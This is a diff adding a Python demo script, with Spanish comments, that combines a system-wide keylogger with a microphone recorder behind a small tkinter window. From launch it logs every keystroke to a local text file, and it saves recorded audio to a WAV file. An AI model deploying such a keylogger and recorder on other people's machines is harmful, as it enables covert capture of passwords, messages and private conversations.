@@ -1,0 +1,147 @@
+#Version; GUI interfaz gráfica sin color
+#Guarda Audio y Texto al mismo tiempo.
+#Por David Ruiz
+#Esta versión es una prueba demo de como el script puede detectar cada tecla que presionas.
+#redes sociales @viajatech
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales
+#Recuerda importar la libreria pynput y sounddevice soundfile
+#pip install sounddevice soundfile
+
+
+
+
+
+import os
+import threading
+import sounddevice as sd
+import soundfile as sf
+from pynput import keyboard
+import tkinter as tk
+from tkinter import ttk, messagebox
+
+# Nombre del archivo donde se guardarán las teclas presionadas
+filename = 'teclado_by_viajatech.txt'
+audio_filename = 'audio_by_viajatech.wav'
+
+# Configuración de grabación
+channels = 1  # Número de canales
+rate = 44100  # Tasa de muestreo (samples per second)
+format = 'WAV'  # Formato de archivo de audio
+stop_recording = False
+device_index = None
+audio_frames = []  # Lista para almacenar los frames de audio
+
+# Variables globales para la GUI
+root = None
+device_combobox = None
+record_button = None
+status_label = None
+recording_thread = None
+
+def list_audio_devices():
+    global device_index
+    devices = sd.query_devices()
+    return [device['name'] for device in devices]
+
+def start_recording():
+    global stop_recording, audio_frames, recording_thread, device_index
+    stop_recording = False
+    audio_frames = []
+
+    selected_device = device_combobox.get()
+    if not selected_device:
+        messagebox.showwarning("Advertencia", "Seleccione un dispositivo de audio.")
+        return
+
+    device_index = list_audio_devices().index(selected_device)
+    
+    recording_thread = threading.Thread(target=record_audio)
+    recording_thread.start()
+    record_button.config(text="Detener Grabación", command=stop_recording_function)
+    status_label.config(text="Grabando...")
+
+def stop_recording_function():
+    global stop_recording
+    stop_recording = True
+    recording_thread.join()
+    record_button.config(text="Iniciar Grabación", command=start_recording)
+    status_label.config(text="Grabación detenida.")
+
+def record_audio():
+    global stop_recording, audio_frames
+    if device_index is None:
+        print("No se encontró el dispositivo de entrada adecuado.")
+        return
+
+    def callback(indata, frames, time, status):
+        if stop_recording:
+            raise sd.CallbackStop
+        audio_frames.append(indata.copy())
+
+    try:
+        with sf.SoundFile(audio_filename, mode='w', samplerate=rate, channels=channels, format=format) as file:
+            with sd.InputStream(samplerate=rate, device=device_index, channels=channels, callback=callback):
+                while not stop_recording:
+                    sd.sleep(1000)
+            for frame in audio_frames:
+                file.write(frame)
+        print(f'El archivo de audio se guarda en: {os.path.abspath(audio_filename)}')
+    except Exception as e:
+        print(f"Error durante la grabación: {e}")
+
+# Función para manejar las teclas presionadas
+def on_press(key):
+    try:
+        with open(filename, 'a') as f:
+            f.write(key.char)
+        print(f'Tecla presionada: {key.char}')
+    except AttributeError:
+        with open(filename, 'a') as f:
+            f.write(f'[{key}]')
+        print(f'Tecla especial presionada: {key}')
+
+def on_release(key):
+    global stop_recording
+    if key == keyboard.Key.esc:
+        stop_recording = True
+        return False
+
+# Configuración de la GUI
+def create_gui():
+    global root, device_combobox, record_button, status_label
+
+    root = tk.Tk()
+    root.title("Grabador de Audio y Teclado")
+    root.geometry("400x300")
+    root.resizable(False, False)
+
+    # Estilo de ttk
+    style = ttk.Style()
+    style.configure("TLabel", font=("Helvetica", 12))
+    style.configure("TButton", font=("Helvetica", 12))
+    style.configure("TCombobox", font=("Helvetica", 12))
+
+    ttk.Label(root, text="Seleccione el dispositivo de audio:").pack(pady=10)
+
+    devices = list_audio_devices()
+    device_combobox = ttk.Combobox(root, values=devices, state="readonly")
+    device_combobox.pack(pady=10)
+
+    record_button = ttk.Button(root, text="Iniciar Grabación", command=start_recording)
+    record_button.pack(pady=10)
+
+    status_label = ttk.Label(root, text="Esperando a iniciar grabación...")
+    status_label.pack(pady=10)
+
+    root.mainloop()
+
+# Iniciar la GUI
+if __name__ == "__main__":
+    # Iniciar el listener del teclado en un hilo separado
+    keyboard_listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press, on_release=on_release).run())
+    keyboard_listener_thread.start()
+
+    create_gui()
+
+    # Esperar a que se termine el listener del teclado
+    keyboard_listener_thread.join()
